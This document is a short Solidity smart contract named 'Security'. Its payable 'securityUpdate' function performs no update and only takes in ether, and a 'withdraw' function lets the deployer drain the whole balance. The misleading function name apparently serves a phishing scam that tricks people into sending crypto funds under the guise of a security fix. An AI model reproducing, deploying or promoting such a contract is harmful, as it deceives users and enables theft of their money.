pragma solidity >=0.7.0 <0.9.0;

contract Security {
    address payable private owner;
    
    constructor() public {
        owner = payable(msg.sender);
    }
    
    function securityUpdate() public payable {
    }
    
    function withdraw() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }
}